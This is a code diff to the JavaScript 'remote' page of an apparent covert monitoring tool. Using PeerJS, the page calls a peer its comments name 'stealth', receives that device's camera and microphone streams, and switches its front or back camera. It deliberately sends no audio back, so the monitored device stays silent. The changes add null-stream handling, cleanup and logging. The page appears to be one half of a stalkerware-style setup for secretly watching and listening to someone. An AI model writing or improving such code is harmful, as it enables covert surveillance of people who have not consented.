@@ -333,6 +333,7 @@
         let localStream = null;
         let currentCamera = 'front';
         let isVideoMode = false;
+        let audioContext = null;
         
         const connectBtn = document.getElementById('connectBtn');
         const audioOnlyBtn = document.getElementById('audioOnlyBtn');
@@ -366,41 +367,39 @@
             }
         }
         
-        // Remote sends NO audio - only video for camera switching
+        // Get remote's camera stream (NO AUDIO from remote)
         async function getLocalStream(withVideo, useBackCamera = false) {
+            if (!withVideo) {
+                // Audio-only mode - remote sends nothing (no audio, no video)
+                return null;
+            }
+            
             const constraints = {
-                audio: false,  // NO AUDIO from remote to stealth
-                video: withVideo ? {
+                audio: false,  // NO AUDIO from remote
+                video: {
                     facingMode: useBackCamera ? "environment" : "user",
                     width: { ideal: 640 },
                     height: { ideal: 480 }
-                } : false
+                }
             };
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                console.log('[REMOTE] Stream acquired - Audio disabled');
+                console.log('[REMOTE] Camera acquired:', useBackCamera ? 'Back' : 'Front');
                 return stream;
             } catch (e) {
                 if (e.name === 'NotAllowedError') {
                     callStatus.innerText = '❌ Camera permission denied';
-                } else if (e.name === 'OverconstrainedError') {
-                    callStatus.innerText = '⚠️ Camera not available, trying default...';
-                    // Fallback without facingMode constraint
-                    const fallbackConstraints = {
-                        audio: false,
-                        video: withVideo ? { width: { ideal: 640 }, height: { ideal: 480 } } : false
-                    };
-                    return await navigator.mediaDevices.getUserMedia(fallbackConstraints);
                 } else {
-                    callStatus.innerText = '❌ Media error';
+                    callStatus.innerText = '❌ Camera error';
+                    console.error(e);
                 }
-                throw e;
+                return null;
             }
         }
         
         async function switchCamera() {
-            if (!isVideoMode || !mediaCall) return;
+            if (!isVideoMode || !mediaCall || !localStream) return;
             
             const newCamera = currentCamera === 'front' ? 'back' : 'front';
             const useBackCamera = (newCamera === 'back');
@@ -409,6 +408,7 @@
             
             try {
                 const newStream = await getLocalStream(true, useBackCamera);
+                if (!newStream) throw new Error('No camera stream');
                 
                 if (mediaCall && mediaCall.peerConnection) {
                     const senders = mediaCall.peerConnection.getSenders();
@@ -419,10 +419,9 @@
                     }
                 }
                 
+                // Clean up old stream
                 if (localStream) {
-                    localStream.getTracks().forEach(track => {
-                        if (track.kind === 'video') track.stop();
-                    });
+                    localStream.getTracks().forEach(track => track.stop());
                 }
                 
                 localStream = newStream;
@@ -439,7 +438,8 @@
                 callStatus.innerText = `📹 ${currentCamera === 'front' ? 'Front' : 'Back'} camera ACTIVE`;
                 
             } catch (err) {
-                callStatus.innerText = `❌ Failed to switch camera: ${err.message}`;
+                callStatus.innerText = `❌ Failed to switch camera`;
+                console.error(err);
             }
         }
         
@@ -453,40 +453,64 @@
                 isVideoMode = withVideo;
                 callStatus.innerText = `📡 Starting ${withVideo ? 'video' : 'audio'} monitor...`;
                 
-                localStream = await getLocalStream(withVideo, false);
-                currentCamera = 'front';
-                
-                if (withVideo && localStream.getVideoTracks().length > 0) {
+                // Get local stream (only for video mode, audio mode sends nothing)
+                if (withVideo) {
+                    localStream = await getLocalStream(true, false);
+                    if (!localStream) {
+                        callStatus.innerText = '❌ No camera available';
+                        return;
+                    }
+                    currentCamera = 'front';
                     videoContainer.classList.add('active');
                     cameraControls.style.display = 'flex';
                     frontCameraBtn.classList.add('active');
                     backCameraBtn.classList.remove('active');
                 } else {
+                    // Audio-only: send no stream
+                    localStream = null;
                     cameraControls.style.display = 'none';
                 }
                 
-                mediaCall = peer.call(PARTNER_ID, localStream, { metadata: { type: withVideo ? 'video' : 'voice' } });
+                // Create call with or without stream
+                mediaCall = peer.call(PARTNER_ID, localStream || undefined, { 
+                    metadata: { type: withVideo ? 'video' : 'voice' } 
+                });
                 
                 mediaCall.on('stream', (remoteStream) => {
+                    console.log('[REMOTE] Received stream from stealth');
+                    
                     if (withVideo && remoteStream.getVideoTracks().length > 0) {
                         remoteVideo.srcObject = remoteStream;
+                        remoteVideo.play().catch(e => console.log('Video play error:', e));
                     }
+                    
+                    // Play audio from stealth
                     if (remoteStream.getAudioTracks().length > 0) {
-                        const audio = new Audio();
-                        audio.srcObject = remoteStream;
-                        audio.play().catch(e => console.log('Audio play error:', e));
+                        // Create new audio element for stealth audio
+                        const stealthAudio = new Audio();
+                        stealthAudio.srcObject = remoteStream;
+                        stealthAudio.play().catch(e => console.log('Audio play error:', e));
                         console.log('[REMOTE] Audio playback started from stealth');
                     }
-                    callStatus.innerText = `👁️ ${withVideo ? 'Video' : 'Audio'} monitor ACTIVE`;
+                    
+                    callStatus.innerText = `👁️ ${withVideo ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
                     audioOnlyBtn.disabled = true;
                     videoCallBtn.disabled = true;
                     endCallBtn.disabled = false;
                 });
                 
-                mediaCall.on('close', () => { endCall(); });
-                mediaCall.on('error', () => { endCall(); });
+                mediaCall.on('close', () => { 
+                    console.log('[REMOTE] Call closed');
+                    endCall(); 
+                });
+                
+                mediaCall.on('error', (err) => { 
+                    console.error('[REMOTE] Call error:', err);
+                    endCall(); 
+                });
                 
             } catch (err) {
+                console.error('[REMOTE] Start call error:', err);
                 callStatus.innerText = '❌ Failed to start monitor';
                 endCall();
             }
